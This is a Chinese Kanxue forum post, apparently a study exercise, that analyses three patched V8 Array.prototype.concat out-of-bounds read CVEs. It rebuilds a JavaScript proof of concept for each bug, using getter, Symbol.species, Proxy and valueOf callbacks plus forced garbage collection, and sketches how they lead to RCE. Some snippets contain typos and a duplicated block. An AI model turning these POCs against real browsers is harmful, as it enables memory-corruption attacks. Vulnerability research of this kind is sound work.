#  V8 Array.prototype.concat函数出现过的issues和他们的POC们   
苏啊树  看雪学苑   2022-09-06 18:05  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8Hv5zTK5ZHG9ibuxbN9AxcaUotWC2vq11c9iceAXT7aNlV1lcLw7cbJXJwcy67MPQrtxEycPaqy3gvQ/640?wx_fmt=jpeg "")  
  
本文为看雪论坛精华文章  
  
看雪论坛作者ID：苏啊树  
#   
  
  
  
**1：写在前面：**  
  
  
最近老是做一些根据文档和代码构造POC的事情，经常想着怎么锻炼这一方面的能力。以v8为例，如果让别人直接指出某个地方有问题，然后让我去找出来，构造POC以至于EXP，以我现在对v8的熟练程度，简直是开玩笑。  
  
  
于是秉着循序渐进的原则，想到了高中做物理题目，就把这个过程理解为高中做开放物理课题的过程。  
  
  
先假设有个出题人，给出了所有满足解题的条件，然后尝试根据这些题目给出的提示解出正确的答案。秉着这个思路给自己设计了一个练习方案。  
  
  
这次设计的练习主要参考的是这篇文章：  
  
https://tiszka.com/blog/CVE_2021_21225.html  
  
  
选择这篇文章做练习的原因：  
  
1：这位师傅对这一系列漏洞触发的成因和条件描写得令人发指的详细。  
  
2：这个系列的漏洞本人以往只是做过利用，对漏洞的原因和触发的条件却  
是一知半解了，很适合目前的我用来练习构造v8 POC的课题。  
  
       
  
先假设这篇文章所说的内容就认为是解题需要的所有条件。  
  
  
当然，不需要跟某些大佬设置的CTF考试一样闭卷考……可以搜索互联网上POC和EXP除外的所有知识要点。  
  
  
尝试根据文中给出代码提示和自己掌握的和搜索的知识构造出POC。  
  
  
最后看看根据自己的理解和实验构造出的POC，和原文给出的POC有什么区别。  
  
  
因为包含三个漏洞，所以没有构建v8环境进行调试，也没有看源代码，其实就这个目的来说也没太大必要，  
如果只说针对构造漏洞触发的条件的话，原文的代码片段及解释已经足够的详细。  
  
  
因此只有下载相应版本的Chrome来测试是否能走到触发漏洞为止。  
  
  
虽然讲的是POC的构造，不过这里还是先介绍这系列漏洞利用的原理吧，毕竟知道怎么玩，才有足够的动力去挖。  
  
  
**1.1：Array.prototype.concat函数漏洞。**  
  
  
这系列的漏洞公告介绍是越界读导致的RCE，一般的越界读漏洞只能获得信息泄露或转换为任意读，但这一系列漏洞却是可以通过越界读来获得RCE。   
  
  
其中的关键点就是巧妙的利用v8的GC机制，来往我们可以索引到的数组元素里面“写进“我们预先构造好的数组地址，来伪造我们可以完全控制的数组，从而获得任意读写的能力，具体过程如下。  
  
  
**1.2：Array.prototype.concat函数漏洞的利用原理：**  
  
  
1.2.1：假设我们拥有这样一个浮点数组var A = [1.1,2.2,3.3,4.4];  
  
  
其在v8的内存布局中是这样的：  (图   1.2.1.1所表示的，在指针压缩引入之前的v8，浮点数组A内存布局，引入之后的A内存布局有些区别，但是在这里的漏洞利用的原理都是一样)  
  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgEYXN9icDEyPickOtUs6UoO1A0CDQoJTzwHHNea3C1WQQbbsoPvMBUNcg/640?wx_fmt=png "")  
  
  
图   1.2.1.1  
  
   
  
假设这个时候length变成了1，并且触发了GC回收，v8一般不会在原内存中重建或保存数组A，相反会在一块新的内存地址中，重建数组A，并更新内存布局，情况会如图 1.2.1.2所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgHaHczdNcM2Rgibl3QBnOzicWDhMrPctO1FUIIO8EzzFIXvnz6kAdkGKQ/640?wx_fmt=png "")  
  
图 1.2.1.2  
  
  
假设这个过程中出现问题数组长度没有变化，length依旧为4，那么重建的数组A，这情况就如同图 1.2.1.3，这种情况下我们就可以通过A[1]越界索引到map，能通过A[3]能索引到elements，泄露出重要的内存地址。  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgsVicdC8BvmlibE0sE1N6mFAexK6lmgiaY8iaOfrlsKTqguUSDgFVzOFRmQ/640?wx_fmt=png "")  
  
  
图 1.2.1.3  
  
  
1.2.2：假设我们原本的数组 var A=[1.1,2.2,3.3,4.4,5.5,{}];，也如上述所讲的情况，将数组length修改为1，触发垃圾CG回收情况，情况就会如图  
1.2.2.1所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgwlzsNbGiclXA5B5XhmbYzmx84ibj7ibibx5fsgicvgSHIqG7RP0hN2WxPQQ/640?wx_fmt=png "")  
  
图 1.2.2.1  
  
   
  
这时候如果length实际上没有更新的话，如图1.2.2.2，我们提前设置好的地址会代替对象{}的地址，因为A[5]原本指向为一个{}对象，所以我们可以通过A[5]索引，把我们预先布局好的对象地址，索引为{}对象。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgf5h0Qmp2bOhxU0BPL2TLbY1bMg0xvREJDZM8nG43bVzf1fZU5xsjAw/640?wx_fmt=png "")  
  
图 1.2.2.2  
  
   
  
通过在预先布局的地址构造好我们的伪造对象数据，可以实现完全控制一个对象，再通过这个完全控制的对象，进一步实现v8进程内存的任意读写，结合前面的信息泄露，就凑够了v8 RCE需要的所有原语。  
  
  
这里漏洞利用有个重要技巧，涉及到v8的CG机制，在作者的  
https://tiszka.com/blog/CVE_2021_21225_exploit.html  
  
writeup里面有详细说明，要了解这漏洞的RCE技巧，以及想了解v8 RCE和CG知识的，建议细读。  
  
   
  
  
**2：关于Array.prototype.concat()出现的历史漏洞**  
  
    
  
**2.1：CVE-2016-1646**  
  
  
2.1.1 CVE-2016-1646 root case  
  
  
漏洞发生在函数Array.prototype.concat()，简单分析一下代码要点。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgJApBESqvok6QGJuhGh2ZXddxJ5KTNxAaXECqTeH3XWWHmTBr4AmCSg/640?wx_fmt=png "")  
  
图 2.1.1.1  
  
  
图2.1.1.1代码所示: Array.prototype.concat的返回放置[1]所示的visitor对象。args表示的是参与函数运算的参数，接下来的循环，需要会对每个参数args->at(i)进行了IteratorElements运算。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgD5L8H1WCsB5AwpOofjyaPGp3PCnv5wS5IoVkrPAsdcia2PCSg53jgQg/640?wx_fmt=png "")  
  
图2.1.1.2  
  
  
图2.1.1.2 : [3]可以看到在IterateElement运算中，会将图 2.1.1.1过程中中的args->at(i)保存在array这个变量之中，然后在[4]过程中将数组array的长度放置在变量length上，并且对数组的类型ElementsKind进行判断，以便接下来做相应的处理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtg3IU7aBEHRial25icA4mgfZU09896VZbtdPUcq8hRMcmB149GNkwMBpkQ/640?wx_fmt=png "")  
  
图2.1.1.3  
  
  
图2.1.1.3 : 在ElementsKind判断之后在[7]中将前面[4]的length的值赋值到fast_length变量中，并用于接下来的FOR_WITH_HANDLE_SCOPE的循环。(也就是说array在Array.prototype.concat运算中返回的数组长度在，这个过程中已经不会再变化，为fast_length)  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtg5cuAzGHv0JxLficlKfC8mqrKQnicRg7ZZoOdiaQ0MD4ZGfdL6wJib6zbRQ/640?wx_fmt=png "")  
  
  
图 2.1.1.4  
  
  
图 2.1.1.4:  
  
  
在  
FOR_WITH_HANDLE_SCOPE  
的循环中，[9]中会取出数组的element，然后[10]判断element是否为hole，  
如果为hole则会调用JSReceiver::GetElement(isolate,array,j)，并调用visitor->visit(j,element)来返回结果。  
  
  
但是问题是JSReceiver::GetElement(isolate,array,j)为v8的Slow运算，该过程会触发Getter回调。  
  
  
我们可以通过在回调中写入任意的JS代码来触发越界读。  
  
  
具体的触发漏洞的做法前面已经说过，将array的length减小，然后触发垃圾回收。因为我们用于FOR_WITH_HANDLE_SCOPE循环的fast_length实际上并没有发生变化，所以结果会读取length之后的数值回去。  
  
   
  
2.1.2 构造POC  
  
  
2.1.2.1综合POC构造需要满足所有条件  
  
  
条件1：创建FAST_DOUBLE_ELEMENTS类型的数组 A；  
  
  
条件2：进入element_value->IsTheHole(isolate) 的代码流程。  
  
  
条件3：在hole元素中。执行JSReceiver::GetElement触发Getter回调。  
  
  
条件4：在回调函数之中减小A数组的长度，并触发CG。  
  
  
条件5: 当然，最后一步需要执行Array.prototype.concat函数，才能走进前面4个条件的执行代码流程。  
  
  
2.1.2.2 POC的构造；  
  
  
条件1：创建FAST_DOUBLE_ELEMENTS类型的数组。  
  
  
代码：  
```
     var A = [1.1,2.2,3.3,4.4,5.5];
```  
  
  
条件2：要满足element_value->IsTheHole(isolate)。  
  
  
这个条件要求在条件1里创建的数组A上创建一个hole，满足ElementValue->IsTheHole(),才会走到条件3的JSReceiver::GetElement分支流程触发回调。  
  
  
代码：  
```
     delete A[1];
     //关于hole是什么：
```  
  
  
https://stackoverflow.com/questions/61420580/can-anyone-explain-v8-bytecode-ldathehole  
  
  
条件3：在hole元素中执行JSReceiver::GetElement触发Getter回调，因此这步构造为  
  
  
因为JSReceiver::GetElement实际上是遍历A的原型，所以这一步构造为：  
  
  
代码：  
```
     A.__proto__=f //(创建A的原型对象)  
     f.__defineGetter__(1,evil);
```  
  
  
条件4：在回调函数之中减小A数组的长度，并触发CG。  
  
  
代码：  
```
     function evil(){
             A.length=1;
             new ArrayBuffer(0x7fe00000);//=>触发CG
     }
```  
  
  
条件5:执行Array.prototype.concat函数，走进前面4个条件的代码执行流程。  
  
  
代码：  
```
     var a = Array.prototype.concat(A);
```  
  
  
为了方便演示，直接将结果打印出来。  
```
    console.log(a);
```  
  
  
2.1.2.3结果演示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgicjfq4Y4q94NZrHHicw22ribApIrlt2vXnBNBRftwXYBLMQJPep66zPPg/640?wx_fmt=png "")  
  
这里可以看到，在hole元素A[1]之后，由于触发了上述所说的越界读漏洞，读取了奇怪的数字代替了原本数组的元素。  
  
  
2.1.3 补丁修复  
  
  
这里的修复的手段是  
  
     ß---------------------------插入了补丁  
```
     +if(!HasOnlySimpleElements(isolate, *receiver))
     +{
     +    return IteratesSlow(isolate, receiver, length, visitor);
     + }
     switch(array->GetElementsKind){
```  
  
  
该补丁是在  
s  
witch(array->GetElementsKind)开始前就插入了HasOn  
lySimpleElements(isolate, *receiver)的检测,检查是否存在Element元素的Getter，Setter回调。  
  
  
如果有，就执行IteratesSlow(isolate, receiver, length, visitor)，不会进入FOR_WITH_HANDLE_SCOPE的循环过程。  
  
   
  
但是FOR_WITH_HANDLE_SCOPE循环过程实际上还存在，如果在FOR_WITH_HANDLE_SCOPE循环里面还能发现有别的办法执行自定义的JS，依旧可以利用自定义的JS来进行数组length减小，垃圾回收的操作，使用同样的办法来触发越界读取漏洞。  
  
  
结合之前的分析结果，可以将触发这一类漏洞的问题就可以分解为两个部分：  
  
  
1）我们可以通过某种手段，绕过HasOnlySimpleElements(isolate, *receiver)的检测，进入FOR_WITH_HANDLE_SCOP循环。  
  
  
2）在FOR_WITH_HANDLE_SCOP循环返回之前，控制执行自定义的JS代码。  
  
   
  
**2.2：CVE-2017-5030**  
  
  
2.2.1在CVE-2016-1646修补之后的几个月， Symbol.species和代理对象Proxy object被引入  
  
  
2.2.1.1：Symbol.species对于Array.prototype.concat的影响：  
  
  
Symbol.species操作会重写对象的构造函数，在Array.prototype.concat这样的JavaScript内置函数中，会使用Symbol.species里面的函数重新加载执行构造函数，来创建新的对象，从而能影响到Array.prototype.concat的返回结果。       
  
  
这里有简单的演示案例：  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgs9qYdK84XHHRccSYDJIib9myYUoBXjibjJIxZrGQLYUQv4MC2L9k0Mjg/640?wx_fmt=png "")  
  
  
图 2.1.1.1  
  
  
图 2.1.1.1简单验证了Symbol.species是可以影响Array.prototype.concat的返回结果，这里将一个Number 5写入了的返回结果。  
  
  
但是问题是Symbol.species，在哪里，如何影响Array.prototype.concat的返回结果。  
  
  
2.2.1.2 Array.prototype.concat实现过程对于Symbol.species的处理  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtg8zZZp8gCibicy7SEJ9xFz4jibVu38BeEG9vG07gx2VwDRzOtn249ASMWg/640?wx_fmt=png "")  
  
图 2.2.1.2  
  
  
实际上v8的处理，是在Array.prototype.concat执行之中，为Symbol.species新建一个Handle<Object> species对象，然后在执行Handle<Object> species对象的JS代码一次，然后将其结果放入visitor之中，从前面2.1中的介绍可以知道，visitor是处理返回的对象。  
  
  
也就是说图 2.2.1.2的代码片段说明，我们通过Handle<Object> species对象的执行，可以在Array.prototype.concat返回visitor之中写入一个我们自己控制的对象。  
  
  
离我们触发漏洞的目的只剩下一步，就是在FOR_WITH_HANDLE_SCOP过程中找到我么写入对象执行回调的机会。  
  
  
在接下来FOR_WITH_HANDLE_SCOP循环的时候，调用了visitor->visit()返回结果。  
  
  
查看改代码片段：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgXUnoMIstspRVx1ocjSibnIMFYbY3JYZsNvn8sjrTia2DLrbGbWnsEh2Q/640?wx_fmt=png "")  
  
图  2.2.1.3  
  
  
图  2.2.1.3的代码片段表示，  
  
  
这里的visitor->visit()最后使用了JSReceiver::CreateDataProperty处理结果，然后作为Array.prototype.concat的返回。  
  
  
仔细看JSReceiver::CreateDataProperty的处理逻辑：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgrwImXgF0oURU5bI2J1QwfVGPHiaobVqZQcoBiadLVkBZvXTibOseiab1EQ/640?wx_fmt=png "")  
  
图  2.2.1.4  
  
  
在JSReceiver::CreateDataProperty中存在JSProxy::DefineOwnProperty分支，其执行过程为：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtge9NKpQD08ibMOA8cp31O4vFZYm2n8cVAPFgV0zhGzCs4EhBscDkiaIsg/640?wx_fmt=png "")  
  
图  2.2.1.5  
  
  
JSProxy::DefineOwnProperty会调用Object::GetMethod方法寻代理对”defineProperty”字符串的代理，很明显这个JSProxy::DefineOwnProperty就是跟随Proxy object代理对象的增加而被引入。  
  
  
Object::GetMethod方法会触发Getter的” defineProperty”回调。  
  
  
2.2.2 构造POC：  
  
  
2.2.2.1 综合POC构造需要满足所有条件  
  
  
条件1：通过的重构函数Symbole.species写入一个对象到Array.prototype.concat的返回对象visiter中。因为并不是Elements之中Setter和Getter回调，所以可以绕过CVE-2016-1646加上的防护，到达我们期望进入的FOR_WITH_HANDLE_SCOPE循环。  
  
  
条件2：通过对写入的对象进行代理设置，可以使代码在返回Array.prototype.concat的visitor->visit()流程中，走进JSReceiver::CreateDataProperty的Maybe<bool> JSProxy::DefineOwnProperty的处理分支中。  
  
  
条件3：对写入的该对象设置”defineProperty”字符串的Getter回调，执行我们自定义的JS代码。  
  
  
条件4：在我们自定义的JS代码里面将length设置为1，然后触发垃圾回收，触发越界读。  
  
  
2.2.2.2 POC的构造：  
  
  
条件1 ：  
  
  
构造Symbol.species重写构造函数在Visitor中加入我们指定的对象MyProxy：  
  
  
代码：  
```
         class MyArray extend Array{
                 static get[Symbol.species](){
                return function(){return MyProxy}
            }
         }
```  
  
  
  
条件2  
  
  
将我们的指定对象MyProxy设置为代理对象，以便在visitor->visit()执行JSReceiver::CreateDataPropert的时候，走进JSProxy::DefineOwnProperty分支触发回调：  
  
  
代码：  
```
      handler = {};
      MyProxy=new Proxy({},handler);
```  
  
  
条件3  
  
  
对该代理对象MyProxy的getter设置”defineProperty”字符串回调，加入我们自定义的JS代码。  
  
  
代码：  
```
     handler.__proto__.__defineGetter(“defineProperty”,evil);
```  
  
  
条件4   
  
  
在我们自定义的代码里面，将数组长度减小，进行垃圾回收，触发越界读。  
  
  
代码：  
```
     function evil(){
             A.length = 1;
             cg();
     }
```  
  
  
2.2.2.4 结果演示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgQE8GrefVqrWeHNicIibiaZfBnRzMD3Vicpjtk7Mfmib1CpuMz6p5qrba7yQ/640?wx_fmt=png "")  
  
图 2.2.2.4  
  
           ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgmugJYuySdU7Ef6I1mbuogHTT58rn1ODDLCLObgTcaEicmZYzrFvicmAA/640?wx_fmt=png "")  
  
  
图 2.2.2.5  
  
  
通过上图，可以看到hole元素及其之后的元素已经被奇怪的数字覆盖，形成了和CVE-2016-1646类似的越界读。  
  
  
//=>这里触发CG    这里是用的垃圾回收方法和第一个POC不同，因为测试的Google Chrome    55.0.2883.87 (正式版本) （64 位）使用前面的CG方式会出现Out of Memory的/问题。  
  
  
2.2.3 补丁修复  
  
  
这里的修复方案是在CVE-2016-1646的检测基础上，又添加了一个检测，检测这个结果对象是否为为”Simple”类型。保证Symbol.species重构函数的返回result object不是一个Proxy Object。  
```
    + if(!visitor->has_simple_elements*+() || !HasOnlySimpleElements(isolate, *receiver)){
           return  IteratorElementsSlow(isolate, receiver, length, visitor);
    }
    Handle<JSObject> array = Handle<JSObject>::cast(receiver);
       switch(array->GetElementsKind()){
       case PACKED_SMI_ELEMENT:
       case PACKED_ELEMENTS:
       case PACKED_FROZEN_ELEMENTS:
      case HOLY_ELEMENTS:{}
    
       }
```  
  
  
这里依旧有两个问题点。  
  
  
1)：我们依旧可以用Symbol.species往visitor里面写入自定义的对象。  
  
  
2)：如果在FOR_WITH_HANDLE_SCOPE循环里面可以用别的方法触发回调，执行自定义的JS代码，那么相同的越界读还是会触发。  
  
  
**2.3 CVE-2021-21225**  
  
  
2.3.1 v8新引进的机制对Array.prototype.concat函数的影响  
  
  
TC39引进了  
Make integer-indexed elements [[Configurable]]  
  
   
  
作者说这意味着  
```
         var u32 = new Uint32Array(64);
         Object.defineProperty(1,{configurable:true});
```  
  
  
也就是所有类型的elements都能进行配置。  
  
   
  
2.3.2.1：新机制对CreateDataProperty的影响  
  
  
从V8脚本引擎的视角，意味着CreateDataProperty(typedArray, 0, 5)是允许的。  
  
  
作者在CreateDataProperty做了深入研究，发现Object::SetDataProperty在原本的基础上里面引入了新逻辑。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtg3fxgTmOEIJwEgS2LHibDSKia1G9icZyPy46ctTEh0QDNvQW5KiamLgWaFA/640?wx_fmt=png "")  
  
图 2.3.2.1  
  
  
图 2.3.2.1  代码片段在Object::SetDataProperty里面有一个逻辑，[5]代码片段显示如果array的元素原本是一个可配置的object，array会将其从Object类型转化为numeric type。  
  
  
但是问题是可配置的Object转换为numeric type数字的过程可以插入我们自定义的JS代码如图 2.3.2.2所示：  
          ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtg57RoIb0hGrVHUyqbY3rkKCuiagmpibJoy4mCohIV3iaU12IhckgoiaicCHQ/640?wx_fmt=png "")  
  
  
图 2.3.2.2  
  
  
图 2.3.2.2这里的实例简单的说明，v8对如果将一个object函数对象转换为数字，会触发原本object对象原本配置的函数过程，可以执行执行用户自定义JS的代码。  
  
  
结合前面分析，我们可以借由Symbol.species重写构造函数，将array的元素走入FOR_WITH_HANDLE_SCOPE循环中的代码片段Object::SetDataProperty里面。  
  
  
如果我们将其中一个元素设置为图 2.3.2.2所示的配置对象，那么这个代码流程会进入图2.3.2.1所示的代码片段，将Object对象转化为Number。    
  
       
  
在Object对象转换为Number对象的时候，会先执行一遍object对象的配置，触发调用object里面的自定义JS代码，这样就可以再一次触发和CVE-2016-1646相同的越界读漏洞。  
  
  
2.3.2构造POC：  
  
  
2.3.2.1 综合POC构造需要满足所有条件  
  
  
条件1：通过Symbole.species写入一个对象到Array.prototype.concat的返回对象visit中。因为并不是Elements之中Setter和Getter回调，所以可以绕过CVE-2016-1646加上的防护，到达我们期望进入的FOR_WITH_HANDLE_SCOPE循环。  
  
  
条件2：对我们的元素进行配置，可以使代码在返回Array.prototype.concat的对象设置visitor->visit()流程中，走进JSReceiver::CreateDataProperty的Maybe<bool> Object::SetDataProperty处理分支中。  
  
  
条件3：配置的元素写入我们自定义的JS代码。  
  
  
条件4：在自定义的JS代码里将length设置为1，然后触发垃圾回收，达到我们期待的越界读。  
  
  
2.3.2.1 POC的构造：  
  
  
条件1 ：构造Symbol.species重写构造函数，以便在我们的代码走入JSReceiver::CreateDataProperty  
  
  
在Visitor中加入我们指定的对象MyProxy，保证PrototypeArray为TypeArray即可：  
  
  
代码：  
```
      MyProperty = new Float64Array(20);
        class MyArray extend Array{
           static get[Symbol.species](){
           return function(){return PrototypeArray}
       }
     }
```  
  
  
这里发现MyProperty = new Float64Array(20);里面的数组如果太小，不会走进这代码流程，和作者一样用var u32 = new Uint32Array(64);不稳定，会崩溃。  
  
  
条件2：  
  
  
对我们的元素进行配置，可以使代码在返回Array.prototype.concat的对象设置visitor->visit()流程中，走进JSReceiver::CreateDataProperty的Maybe<bool> Object::SetDataProperty处理分支中。  
```
    var A = new MyArray(20);
    A.fill(1.1);
    delete A[1];
```  
  
  
条件3：  
配置的函数写入我们自定义的JS代码。  
  
  
条件4：在自定义的JS代码里将length设置为1，然后触发垃圾回收，达到我们期待的越界读。  
```
       A.__proto__[1]={
           valueOf: function(){
           A.length=1;
           gc();
       }
      }       A.__proto__[1]={
           valueOf: function(){
           A.length=1;
           gc();
       }
      }
```  
  
  
2.3.2.2将POC进行整合  
```
      function gc() {
         for (var i = 0; i < 0x100000; ++i) {
            var a = new String();
       }
      }
  
  
     let PrototypeArray = new Float64Array(20);
     class MyArray extends Array {
     static get [Symbol.species]() {
        return function() { return PrototypeArray; }
        };
     }
     var A = new MyArray(20);
     A.fill(1.1);
     delete A[1];
     A.__proto__[1]={
     valueOf: function() {
        A.length = 1;
       gc();
     }
    };
  
    var c = Array.prototype.concat.call(A);
    console.log(c);
```  
  
  
2.3.2.2结果演示  
  
  
遗憾的并没有成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgnqsbTqiaVMOibHn63teWOsPJibmVCKDxAa1233oj8DLn59QDgB5zlmx9g/640?wx_fmt=png "")  
  
 图 2.3.2.2     
  
  
按照图 2.3.2.2报错提示说在MyArray.concat中出现问题，说是[object Object]只有getter，不能设置其长度，因为在Array.prototype.concat.call过程中MyArray已经被新的构造函数重写为let PrototypeArray = new Float64Array(20);的PrototypeArray，所以这个[object Object]应该指的就是PrototypeArray，  
  
再者这里说property length不能设置导致错误，我们尝试随意对PrototypeArray配置其length属性的setter，看会出现什么。  
  
  
因为本人也不知道Setter设置需要是什么，所以这里这里测试设置为数字1。  
```
  PrototypeArray.__defineSetter__('length', 1);
```  
  
  
得出来的报错为：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgnqsbTqiaVMOibHn63teWOsPJibmVCKDxAa1233oj8DLn59QDgB5zlmx9g/640?wx_fmt=png "")  
  
图 2.3.2.3  
  
  
图 2.3.2.3提示时出现了Excepting Function，我们可以看到这里Setter应该配置为function。  
```
    PrototypeArray.__defineSetter__('length', function(){});
```  
  
  
最后成功出现越界读现象。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgHA0KPiauOa9SltN0GsZurXdc9KxXhcycPMYwadNWt5xBibiavR5pVkYaw/640?wx_fmt=png "")  
  
 图 2.3.2.4  
  
  
  
**总结：**  
  
  
第一：三个案例写出的POC都是根据作者的提示，最后写的和作者给出的差不多，有点区别的是三个实例中的触发的回调,本人用的都是用__proto__，也就是对其原型进行设置，作者设置方式比较灵活，貌似在很多情况下没什么必要。  
  
  
第二：在CVE-2021-21225的构造中，发现用Float64Array作为TypeArray的时候最为稳定，并且element的不能太少，否则不能触发，并且不知道为什么要设置PrototypeArray.__defineSetter__('length', function(){});，难道是因为作为构造函数返回对象的PrototypeArray 的length默认不能改变？  
  
  
总之最后一个POC都是连懵带猜的拼凑出来的，有兴趣研究的同学可以自己去看看源码为什么。  
  
  
第三：其实也是作者原文想说明的，v8对于CVE-2016-1646和CVE-2017-5030的修复没有修补在源头上。  
  
  
最后v8的修复方案是对FOR_WITH_HANDLE_SCOPE循环里的函数设置了个assert，让这期间发生自定义的JS回调就抛出异常崩溃，也算是彻底断绝了这个函数的漏洞。  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GZ3ibyJL3lH8zQuQcXtaPtgAm0agUsPnBGg05QicJdbOad5eTCIPc2rZZgy06atvcun6VCemFTMr6g/640?wx_fmt=png "")  
  
  
**看雪ID：苏啊树**  
  
https://bbs.pediy.com/user-home-808412.htm  
  
*本文由看雪论坛 苏啊树 原创，转载请注明来自看雪社区  
  
  
[](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458467650&idx=2&sn=3097b919b0c0f037c2a31719929399b7&chksm=b18e0dc886f984de4952af2b3c3127a347efce4cb4c4638effb0b96618b022aa70d85ddb1978&scene=21#wechat_redirect)  
  
  
  
**#****往期推荐**  
  
1.[四级分页下的页表自映射与基址随机化原理介绍](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458467476&idx=2&sn=aff2cb20d617269e6c936e3d1a0fa20d&chksm=b18e0c1e86f9850844ab9ed32cd6c29f6a98ac2a51479cf6f68a528f8c15f925bc2e7b3651da&scene=21#wechat_redirect)  
  
  
2.[Android 10属性系统原理，检测与定制源码反检测](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458466750&idx=1&sn=0492ee47c3d5ba3e8679a8e4df27dc3c&chksm=b18e093486f9802204d10023d63e531dad601eb9eb6444d991f4879c0103cb7f57d7d4cbde5d&scene=21#wechat_redirect)  
  
  
3.[WhatsApp私信协议实现记录](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458466600&idx=2&sn=686480e121b729cd45ee6d391553472e&chksm=b18e09a286f980b43f67d83fa54f8eb3b37301080d2fa9aa90f271009979cc2585bd642dffb0&scene=21#wechat_redirect)  
  
  
4.[Android4.4和8.0 DexClassLoader加载流程分析之寻找脱壳点](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458466115&idx=1&sn=775e2da02a0627973d4d65da2b7bd343&chksm=b18e07c986f98edf26db4ed7e53d91309187a1135b5cc7f33d6c3e93fddfd419e1c0201f89fe&scene=21#wechat_redirect)  
  
  
5.[实战DLL注入](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458465984&idx=1&sn=81a0007f90a57434b1a78cbd508020f2&chksm=b18e064a86f98f5c98ea12c3d02efab9fceac732b444dd517e446839750304d98e3f6c637d42&scene=21#wechat_redirect)  
  
  
6.[某车联网APP加固分析](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458465858&idx=1&sn=1dc3e63174341873bf5cbec39426874c&chksm=b18e06c886f98fde03eaee13675e184b870a438c7c760ae859fe94547ad354796fc50b0bc35d&scene=21#wechat_redirect)  
****  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球在看**  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicd7icG69uHMQX9DaOnSPpTgamYf9cLw1XbJLEGr5Eic62BdV6TRKCjWVSQ/640?wx_fmt=gif "")  
  
点击“阅读原文”，了解更多！  
